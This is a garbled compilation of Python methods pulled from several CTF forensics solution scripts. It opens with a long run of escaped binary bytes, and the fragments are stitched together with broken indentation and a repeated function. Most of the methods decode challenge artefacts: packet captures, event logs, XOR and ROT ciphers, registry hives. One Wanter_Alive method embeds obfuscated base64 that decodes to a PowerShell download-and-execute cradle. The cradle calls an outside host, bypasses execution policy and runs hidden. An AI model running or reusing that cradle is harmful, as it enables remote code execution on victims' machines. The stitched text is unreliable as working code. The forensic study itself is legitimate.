\x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2&#34;\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\&#39;\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\&#39;\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\&#39;;r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99&lt;)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12&lt;{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5&gt;&#34;\&#39;\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8&#34;\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&amp;|&gt;\x13(&lt;\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&amp;\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6&lt;\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18&lt;\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&amp;? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&amp;\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3&lt;\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04&lt;\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&amp;[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac&lt;N7)g\x9f\xc1\xd8p\xab\&#39;\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%&#34;p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c&lt;\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-&#34;\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&amp;+\xf7\x83Oj\x9d\xab\xb7Uh&#34;z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K&gt;qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\&#39;\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]&#34;\xb2\xa8\x82\xac`\&#39;L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00&#39;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def demarshalling(self):
        &#34;&#34;&#34;
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        &#34;&#34;&#34;
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def decrypting_packet(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;
        # packet_data_path = self.folfil(&#34;data&#34;, &#34;packet_1.data&#34;)

        ending_number = 79

        for num in range(78, ending_number + 1):
            packet_data_path = self.folfil(&#34;data&#34;, f&#34;packet_{num}.data&#34;)

            with open(packet_data_path, &#34;rb&#34;) as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f&#34;Packet {num} :&#34;)
            print(decrypted_data)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == &#34;scapy&#34;:
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == &#34;pyshark&#34;:
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = &#34;packets.pickle&#34;,
        folder_save: str = &#34;data&#34;,
    ):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to &#34;packets.pickle&#34;.
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to &#34;data&#34;.
        &#34;&#34;&#34;

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file

            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            packets = self.pickle_load_data(file_path)
        return packets

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_stream_extract(self, packets, stream_num=None):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            packets (dict): Dictionary of packets
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            save=True,
            filename_save=&#34;packets_scapy.pickle&#34;,
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if packet.tcp.stream == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extrac_tcp_stream_numbers(self, pcap_file):
        &#34;&#34;&#34;
        Description:
            Extracts the tcp stream numbers from the pcap

        Args:
            pcap_file (str): Path to the pcap file.

        Returns:
            dict: Dictionary of session indexes
        &#34;&#34;&#34;
        # To save the stream indexes
        sess_index = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, &#34;stream&#34;):
                sess_index[i + 1] = pkt.tcp.stream
        return sess_index

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pyshark_extract_tcp_streams(self, pcap_file, stream_num):
        # To save the stream indexes
        packet_dict = {}
        cap = self.smart_extract_packets(
            pcap_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        for i, pkt in enumerate(cap):
            if hasattr(pkt.tcp, &#34;stream&#34;) and int(pkt.tcp.stream) == stream_num:
                packet_dict[i + 1] = pkt
        return packet_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def testin_streams(self):
        # session_index = self.pyshark_extrac_tcp_stream_numbers(self.challenge_file)
        print(&#34;Extracting tcp stream&#34;)
        packets = self.pyshark_extract_tcp_streams(self.challenge_file, 4)
        print(&#34;Extracted Streams&#34;)
        # self.pickle_save_data(packets, &#34;packets_stream_4.pickle&#34;)

        packet_keys = packets.keys()
        packet_keys = sorted(packet_keys)

        # print(&#34;Packet keys:&#34;, packet_keys)

        for i in range(packet_keys[0], packet_keys[0] + 7):
            print(f&#34;Packet {i}:&#34;)
            print(packets[i].tcp.payload)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def get_scapy_tcp_stream(self, nunber: int):
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            raw=True,
            save=True,
            filename_save=&#34;packets_scapy_raw.pickle&#34;,
        )
        stream = packets.sessions()
        return stream

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def custom_packet_997_attempt(self):
        stream_4 = self.custom_stream_extract(stream_num=4)
        decrypted_data = self.dec_file_mes(stream_4[997].load, self.encryption_key)
        # print(decrypted_data)
        md5_hash = hashlib.md5(decrypted_data).hexdigest()
        print(&#34;MD5 Hash of the byte string:&#34;, md5_hash)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def main(self):
        # self.demarshalling()
        # self.testin_streams()
        # self.save_encryption_key(self.key, self.folfil(&#34;data&#34;, &#34;key.pem&#34;))
        # packets = self.pickle_load_data(&#34;packets_dict.pickle&#34;)
        # packets_stream = self.pickle_load_data(&#34;packets_stream_4.pickle&#34;)
        # print(packets[76].load)
        # print(packets_stream[76])
        print(self.get_scapy_tcp_stream(4))

        # /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def deobfuscation(self):

        latifoliado = &#34;U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe&#34;

        latifoliado = (
            latifoliado
            + &#34;XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl&#34;
        )
        latifoliado = (
            latifoliado
            + &#34;uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc&#34;
        )
        latifoliado = latifoliado + &#34;CcpKSkpd2FudGVkCgd2FudGVkCg&#34;

        parrana = &#34;d2FudGVkCg&#34;

        arran = &#34; d2FudGVkCg d2FudGVkCg &#34;
        arran = arran + &#34;$d2FudGVkCgCod2FudGVkCgd&#34;
        arran = arran + &#34;id2FudGVkCggod2FudGVkCg &#34;
        arran = arran + &#34;d2FudGVkCg&#34; + latifoliado + &#34;d2FudGVkCg&#34;
        arran = arran + &#34;$d2FudGVkCgOWd2FudGVkCgj&#34;
        arran = arran + &#34;ud2FudGVkCgxdd2FudGVkCg &#34;
        arran = arran + &#34;=d2FudGVkCg [d2FudGVkCgs&#34;
        arran = arran + &#34;yd2FudGVkCgstd2FudGVkCge&#34;
        arran = arran + &#34;md2FudGVkCg.Td2FudGVkCge&#34;
        arran = arran + &#34;xd2FudGVkCgt.d2FudGVkCge&#34;
        arran = arran + &#34;nd2FudGVkCgcod2FudGVkCgd&#34;
        arran = arran + &#34;id2FudGVkCgngd2FudGVkCg]&#34;
        arran = arran + &#34;:d2FudGVkCg:Ud2FudGVkCgT&#34;
        arran = arran + &#34;Fd2FudGVkCg8.d2FudGVkCgG&#34;
        arran = arran + &#34;ed2FudGVkCgtSd2FudGVkCgt&#34;
        arran = arran + &#34;rd2FudGVkCgind2FudGVkCgg&#34;
        arran = arran + &#34;(d2FudGVkCg[sd2FudGVkCgy&#34;
        arran = arran + &#34;sd2FudGVkCgted2FudGVkCgm&#34;
        arran = arran + &#34;.d2FudGVkCgCod2FudGVkCgn&#34;
        arran = arran + &#34;vd2FudGVkCgerd2FudGVkCgt&#34;
        arran = arran + &#34;]d2FudGVkCg::d2FudGVkCgF&#34;
        arran = arran + &#34;rd2FudGVkCgomd2FudGVkCgb&#34;
        arran = arran + &#34;ad2FudGVkCgsed2FudGVkCg6&#34;
        arran = arran + &#34;4d2FudGVkCgStd2FudGVkCgr&#34;
        arran = arran + &#34;id2FudGVkCgngd2FudGVkCg(&#34;
        arran = arran + &#34;$d2FudGVkCgcod2FudGVkCgd&#34;
        arran = arran + &#34;id2FudGVkCggod2FudGVkCg)&#34;
        arran = arran + &#34;)d2FudGVkCg;pd2FudGVkCgo&#34;
        arran = arran + &#34;wd2FudGVkCgerd2FudGVkCgs&#34;
        arran = arran + &#34;hd2FudGVkCgeld2FudGVkCgl&#34;
        arran = arran + &#34;.d2FudGVkCgexd2FudGVkCge&#34;
        arran = arran + &#34; d2FudGVkCg-wd2FudGVkCgi&#34;
        arran = arran + &#34;nd2FudGVkCgdod2FudGVkCgw&#34;
        arran = arran + &#34;sd2FudGVkCgtyd2FudGVkCgl&#34;
        arran = arran + &#34;ed2FudGVkCg hd2FudGVkCgi&#34;
        arran = arran + &#34;dd2FudGVkCgded2FudGVkCgn&#34;
        arran = arran + &#34; d2FudGVkCg-ed2FudGVkCgx&#34;
        arran = arran + &#34;ed2FudGVkCgcud2FudGVkCgt&#34;
        arran = arran + &#34;id2FudGVkCgond2FudGVkCgp&#34;
        arran = arran + &#34;od2FudGVkCglid2FudGVkCgc&#34;
        arran = arran + &#34;yd2FudGVkCg bd2FudGVkCgy&#34;
        arran = arran + &#34;pd2FudGVkCgasd2FudGVkCgs&#34;
        arran = arran + &#34; d2FudGVkCg-Nd2FudGVkCgo&#34;
        arran = arran + &#34;Pd2FudGVkCgrod2FudGVkCgf&#34;
        arran = arran + &#34;id2FudGVkCgled2FudGVkCg &#34;
        arran = arran + &#34;-d2FudGVkCgcod2FudGVkCgm&#34;
        arran = arran + &#34;md2FudGVkCgand2FudGVkCgd&#34;
        arran = arran + &#34; d2FudGVkCg$Od2FudGVkCgW&#34;
        arran = arran + &#34;jd2FudGVkCguxd2FudGVkCgD&#34;

        return arran

        # /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def main(self):

        text = self.deobfuscation()
        text = text.split(&#34; &#34;)

        for i in text:
            print(self.decode_base64(i.strip()))

        # /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def xor_function_dec(self, given_string, length):
        xor_key = 45
        result = bytearray()
        for i in range(length):
            result.append(given_string[i] ^ xor_key)
            xor_key = (xor_key ^ 99) ^ (i % 254)
        return bytes(result)

        # /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def regexp(self, file_content):
        pattern = b&#34;sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa&#34;
        index = file_content.find(pattern)
        index = index + len(pattern)
        return index

        # /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def main(self):
        file_content = open(self.challenge_file, &#34;rb&#34;).read()
        index = self.regexp(file_content)
        payload = file_content[index : index + 13082]
        payload = self.xor_function_dec(payload, len(payload))
        print(payload)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.folder_logs = self.Path(self.folder_files, &#34;Logs&#34;)
        self.folder_xml = self.Path(self.folder_data, &#34;xml&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def evtx_open(self, file, func, *args, **kwargs):
        with evtx.Evtx(file) as log_file:
            func(log_file, file, *args, **kwargs)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def searching_records(self, log_file, func, *args, **kwargs):
        for record in log_file.records():
            func(record, *args, **kwargs)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def saving_xml(self, log_file, file, display=False):
        xml_file = self.Path(self.folder_xml, f&#34;{file.name}.xml&#34;)
        if display:
            print(&#34;-&#34; * 50)
            print(f&#34;File: {file}&#34;)
            print(&#34;-&#34; * 50)

        with open(xml_file, &#34;w&#34;) as f:
            for record in log_file.records():
                record_xml = record.xml()
                if display:
                    print(record_xml)
                f.write(record_xml)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_evtx_analysis(self, file):
        with evtx.Evtx(file) as log_file:
            self.saving_xml(log_file, file, display=False)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_searching_file(self, file, *args, **kwargs):
        return self.search_for_base64(file, *args, **kwargs)

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def sorting_results(self, results):
        results = list(set(results))
        results = sorted(results, key=lambda x: len(x), reverse=True)
        return results

        # /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def main(self):

        # Converting evtx files to xml
        # self.exec_on_files(self.folder_logs, self.local_evtx_analysis)

        # Searching for base64 strings in xml files
        base64_strings = self.exec_on_folder(
            folder=self.folder_xml,
            func=self.local_searching_file,
            display=False,
            save=True,
            strict=True,
        )

        base64_strings = self.sorting_results(base64_strings)
        print(base64_strings[0])
        flag = self.decode_base64(base64_strings[0])
        print(flag)
        flag = self.re_match_partial_flag(flag, origin=&#34;HTB&#34;)

        second_part = base64_strings[5]
        flag = &#34;&#34;.join(flag[0]) + self.decode_base64(second_part)

        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_strings(self, file_path, min_length=4):
        &#34;&#34;&#34;
        Description:
            Extracts printable strings from a file

        Args:
            file_path (str): The path to the file
            min_length (int): The minimum length of the string to extract

        Returns:
            list: The list of strings

        &#34;&#34;&#34;
        with open(file_path, &#34;rb&#34;) as f:
            # Read the entire file as binary
            data = f.read()

            # Use a regular expression to find sequences of printable characters
            # The regex matches sequences of characters that are printable (ASCII 32-126)
            # and have a minimum length defined by min_length
            strings = re.findall(rb&#34;[ -~]{%d,}&#34; % min_length, data)

            # Decode the byte strings to regular strings
            return [s.decode(&#34;utf-8&#34;, errors=&#34;ignore&#34;) for s in strings]

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_exif(self, file_path):
        &#34;&#34;&#34;
        Description:
            Extracts EXIF data from a file

        Args:
            file_path (str): The path to the file

        Returns:
            dict: The EXIF data
        &#34;&#34;&#34;
        # with exiftool.ExifTool() as et:
        with exiftool.ExifToolHelper() as et:
            # Read the EXIF data from the file but not duplicate ones
            # metadata = et.get_metadata(
            #     file_path,
            # )

            metadata = et.get_metadata([file_path])

            # Return the EXIF data
            return metadata

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def ascii_rot(self, text, n):
        &#34;&#34;&#34;
        Description:
            Rotates the ASCII characters in a string by n positions

        Args:
            text (str): The text to rotate
            n (int): The number of positions to rotate



        &#34;&#34;&#34;
        roted_text = &#34;&#34;
        for i in text:
            ascii_str = ord(i) + n
            if ascii_str &gt; 126:
                # This is to avoid the non-printable characters
                roted_text += chr((ascii_str % 127) + 32)
            elif ascii_str &lt; 33:
                # This is to avoid the non-printable characters
                roted_text += chr(ascii_str + 33)
            else:
                roted_text += chr(ascii_str)

        return roted_text

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def brute_ascii_rot(self, text, identifier):
        &#34;&#34;&#34;
        Description:
            Brute forces the rotation of ASCII characters in a string

        Args:
            text (str): The text to rotate
            identifier (str): The string to search for in the rotated text

        Returns:
            str: The rotated text
        &#34;&#34;&#34;
        for j in range(200):
            flag = self.ascii_rot(text, j)
            if identifier in flag:
                print(j)
                return flag

        # /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def main(self):
        # Extract strings from the file
        strings = self.extract_strings(self.challenge_file, min_length=10)

        # # Print the strings
        # for s in strings:
        #     print(s)

        # exifs = self.extract_exif(self.challenge_file)
        # Print the EXIF data

        comment = &#34;&#34;&#34;2m{y!&#34;%w2&#39;z{&amp;o2UfX~ws%!._s+{ (&amp;@Vwu{ (&amp;@_w%{v{(&amp;0.&#34;&#34;&#34;

        flag = self.brute_ascii_rot(comment, &#34;CTFlearn&#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def main(self):
        # flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        # print(flag)
        self.solve(self.challenge_file)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def solve(self, hive_path):
        with open(hive_path, &#34;rb&#34;) as f:
            data = f.read()

        cell, class_len = find_skew1_cell(data)

        # variant 1: exact header + class-name bytes = 4 + class_len
        flag1_blob = cell.data[: REG_CELL_HDR + class_len]

        # variant 2: entire cell (may include 0-4 bytes padding)
        flag2_blob = cell.data

        print(
            &#34;\nFound Skew1 class-name cell @ 0x{:X}, length {} bytes&#34;.format(
                cell.off, cell.size
            )
        )
        print(&#34;Class-name  :&#34;, cell.data[4 : 4 + class_len].decode(&#34;utf-16le&#34;))
        print(&#34;\nSubmit either of the following (depending on challenge checker):&#34;)
        print(&#34; 1) no-padding : ECSC{{{}}}&#34;.format(flag1_blob.hex().upper()))
        print(&#34; 2) with pad   : ECSC{{{}}}&#34;.format(flag2_blob.hex().upper()))

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -&gt; str:
        with open(hive_path, &#34;rb&#34;) as f:
            data = f.read()

        # 1) locate the ASCII string Skew1
        skew_idx = data.find(b&#34;Skew1&#34;)
        if skew_idx == -1:
            raise ValueError(&#34;Could not find Skew1 key name in hive&#34;)

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b&#34;nk&#34;, 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError(&#34;`nk` signature not found before Skew1&#34;)

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from(&#34;&lt;I&#34;, data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from(&#34;&lt;H&#34;, data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell  grab its whole body
        cell_size = struct.unpack_from(&#34;&lt;i&#34;, data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f&#34;ECSC{{{cell_blob.hex().upper()}}}&#34;

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def main(self):
        flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -&gt; str:
        with open(hive_path, &#34;rb&#34;) as f:
            data = f.read()

        # 1) locate the ASCII string Skew1
        skew_idx = data.find(b&#34;Skew1&#34;)
        if skew_idx == -1:
            raise ValueError(&#34;Could not find Skew1 key name in hive&#34;)

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b&#34;nk&#34;, 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError(&#34;`nk` signature not found before Skew1&#34;)

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from(&#34;&lt;I&#34;, data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from(&#34;&lt;H&#34;, data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
